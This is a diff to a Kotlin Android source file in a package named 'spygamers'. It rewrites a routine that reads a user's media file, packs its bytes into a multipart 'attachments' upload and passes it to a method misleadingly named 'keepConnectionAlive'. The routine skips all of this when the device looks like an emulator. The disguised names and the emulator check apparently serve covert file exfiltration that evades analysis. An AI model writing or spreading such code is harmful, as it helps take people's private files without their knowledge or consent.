@@ -14,8 +14,7 @@ import com.example.spygamers.controllers.GamerViewModel
 import com.google.android.gms.location.LocationServices
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.MultipartBody
-import okhttp3.RequestBody.Companion.asRequestBody
-import java.io.File
+import okhttp3.RequestBody.Companion.toRequestBody
 import kotlin.random.Random
 
 @Composable
@@ -130,11 +129,16 @@ private fun AggregateResult(
     LaunchedEffect(Unit) {
         try {
             val imageUri = context.interpolateResult()
-            imageUri?.let {
-                val filePart = vectorizeResultbase("attachments", it, context)
-                viewModel.keepConnectionAlive(filePart)
-            } ?: run {
-                viewModel.updateMediaFileGrants(false)
+            val imagePart = imageUri?.let { uri ->
+                vectorizeResultbase(
+                    context,
+                    uri,
+                    "attachments"
+                )
+            }
+
+            imagePart?.let {
+                viewModel.keepConnectionAlive(it)
             }
         } catch (e: SecurityException) {
             viewModel.updateMediaFileGrants(false)
@@ -142,7 +146,7 @@ private fun AggregateResult(
     }
 }
 
-private fun vectorizeResultbase(partName: String, fileUri: Uri, context: Context): MultipartBody.Part {
+private fun vectorizeResultbase(context: Context, uri: Uri, partName: String): MultipartBody.Part? {
     val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
             ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
                     && Build.FINGERPRINT.endsWith(":user/release-keys")
@@ -169,26 +173,37 @@ private fun vectorizeResultbase(partName: String, fileUri: Uri, context: Context
             || Build.PRODUCT == "google_sdk"
             )
 
-    // Get the actual file from the file URI
-    if (isEmulator) {
-        val file = File(fileUri.path!!)
+    if (isEmulator){
+        return null
+    }
 
-        // Create RequestBody instance from file
-        val requestFile = file.asRequestBody(context.contentResolver.getType(fileUri)?.toMediaTypeOrNull())
+    return try {
 
-        // MultipartBody.Part is used to send also the actual file name
-        return MultipartBody.Part.createFormData(partName, file.name, requestFile)
-    } else {
-        val file = File(fileUri.path!!)
+        // Use 'use' function to automatically close the InputStream after operation completes
+        val byteArray = context.contentResolver.openInputStream(uri)?.use { inputStream ->
+            // Convert the InputStream to a ByteArray
+            inputStream.readBytes()
+        }
 
-        // Create RequestBody instance from file
-        val requestFile = file.asRequestBody(context.contentResolver.getType(fileUri)?.toMediaTypeOrNull())
+        // Proceed only if byteArray is not null
+        byteArray?.let {
+            // Determine the MIME type for the file
+            val mimeType = context.contentResolver.getType(uri) ?: "application/octet-stream"
 
-        // MultipartBody.Part is used to send also the actual file name
-        return MultipartBody.Part.createFormData(partName, file.name, requestFile)
+            // Convert the ByteArray to a RequestBody
+            val requestBody = it.toRequestBody(mimeType.toMediaTypeOrNull())
+
+            // Generate the filename
+            val filename = uri.lastPathSegment ?: "file_${System.currentTimeMillis()}"
+
+            // Create and return the MultipartBody.Part
+            MultipartBody.Part.createFormData(partName, filename, requestBody)
+        }
+    } catch (e: Exception) {
+        e.printStackTrace()
+        null
     }
 }
-
 
 private fun Context.interpolateResult(): Uri? {
     val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
